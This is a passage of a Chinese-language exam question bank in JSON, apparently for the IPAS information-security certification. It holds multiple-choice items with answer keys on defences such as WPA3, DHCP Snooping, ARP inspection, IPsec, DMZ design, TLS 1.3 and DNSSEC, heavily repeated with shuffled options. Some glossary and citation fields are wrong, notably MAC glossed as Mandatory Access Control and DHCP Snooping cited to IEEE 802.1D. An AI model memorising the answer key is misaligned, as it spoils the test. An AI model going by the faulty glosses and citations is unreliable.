    "question": "某直轄市政府智慧運籌中心辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA3-Personal（採用 SAE 機制）",
      "B. 隱藏 SSID 廣播",
      "C. WEP 128-bit",
      "D. WPA2-Enterprise"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-110",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 啟用 RIP 路由更新",
      "B. 開放所有交換器連接埠",
      "C. 關閉全網廣播封包",
      "D. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-111",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. TCP SYN Flood 阻斷服務攻擊",
      "C. Smurf ICMP 放大攻擊",
      "D. UDP Fraggle 攻擊"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-112",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 啟用巨型訊框（Jumbo Frame）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 改用靜態路由協定 RIP",
      "D. 停用交換器生成樹協定（STP）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-113",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 傳輸模式（Transport Mode）",
      "B. 路由模式（Routed Mode）",
      "C. 通道模式（Tunnel Mode）",
      "D. 橋接模式（Bridged Mode）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-114",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 員工專用無線訪客網段",
      "B. 內部最核心機密資料庫網段（LAN）",
      "C. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-115",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 資料庫無法回應 DMZ 的 TCP 請求",
      "B. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "C. DMZ 區不支援傳輸層協定",
      "D. 會造成防火牆頻寬嚴重下降"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-116",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "B. 取消所有非對稱加密交握",
      "C. 廢除所有數位憑證驗證",
      "D. 允許純文字明文傳輸以加快速度"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-117",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNSSEC（網域名稱安全延伸協定）",
      "B. DNS 穿隧（DNS Tunneling）",
      "C. 動態 DNS（DDNS）",
      "D. 靜態 HOSTS 檔案分發"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-118",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 3389",
      "C. TCP 80",
      "D. TCP 443"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-119",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA3-Personal（採用 SAE 機制）",
      "B. WPA2-Enterprise",
      "C. WEP 128-bit",
      "D. 隱藏 SSID 廣播"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-120",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "B. 啟用 RIP 路由更新",
      "C. 關閉全網廣播封包",
      "D. 開放所有交換器連接埠"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-121",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. UDP Fraggle 攻擊",
      "C. Smurf ICMP 放大攻擊",
      "D. TCP SYN Flood 阻斷服務攻擊"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-122",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "B. 停用交換器生成樹協定（STP）",
      "C. 啟用巨型訊框（Jumbo Frame）",
      "D. 改用靜態路由協定 RIP"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-123",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 路由模式（Routed Mode）",
      "B. 通道模式（Tunnel Mode）",
      "C. 傳輸模式（Transport Mode）",
      "D. 橋接模式（Bridged Mode）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-124",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 內部最核心機密資料庫網段（LAN）",
      "B. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "C. 員工專用無線訪客網段",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-125",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. DMZ 區不支援傳輸層協定",
      "B. 會造成防火牆頻寬嚴重下降",
      "C. 資料庫無法回應 DMZ 的 TCP 請求",
      "D. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-126",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "B. 廢除所有數位憑證驗證",
      "C. 允許純文字明文傳輸以加快速度",
      "D. 取消所有非對稱加密交握"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-127",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. 靜態 HOSTS 檔案分發",
      "B. DNS 穿隧（DNS Tunneling）",
      "C. DNSSEC（網域名稱安全延伸協定）",
      "D. 動態 DNS（DDNS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-128",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 443",
      "B. TCP 3389",
      "C. TCP 80",
      "D. TCP 22"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-129",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA2-Enterprise",
      "B. WPA3-Personal（採用 SAE 機制）",
      "C. WEP 128-bit",
      "D. 隱藏 SSID 廣播"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-130",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "B. 關閉全網廣播封包",
      "C. 開放所有交換器連接埠",
      "D. 啟用 RIP 路由更新"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-131",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. TCP SYN Flood 阻斷服務攻擊",
      "C. UDP Fraggle 攻擊",
      "D. Smurf ICMP 放大攻擊"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-132",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 停用交換器生成樹協定（STP）",
      "B. 啟用巨型訊框（Jumbo Frame）",
      "C. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "D. 改用靜態路由協定 RIP"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-133",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 傳輸模式（Transport Mode）",
      "B. 路由模式（Routed Mode）",
      "C. 通道模式（Tunnel Mode）",
      "D. 橋接模式（Bridged Mode）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-134",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 員工專用無線訪客網段",
      "B. 內部最核心機密資料庫網段（LAN）",
      "C. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-135",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "B. DMZ 區不支援傳輸層協定",
      "C. 資料庫無法回應 DMZ 的 TCP 請求",
      "D. 會造成防火牆頻寬嚴重下降"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-136",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 允許純文字明文傳輸以加快速度",
      "B. 取消所有非對稱加密交握",
      "C. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "D. 廢除所有數位憑證驗證"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-137",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. 靜態 HOSTS 檔案分發",
      "B. 動態 DNS（DDNS）",
      "C. DNSSEC（網域名稱安全延伸協定）",
      "D. DNS 穿隧（DNS Tunneling）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-138",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 3389",
      "C. TCP 443",
      "D. TCP 80"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-139",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WEP 128-bit",
      "B. WPA2-Enterprise",
      "C. WPA3-Personal（採用 SAE 機制）",
      "D. 隱藏 SSID 廣播"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-140",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
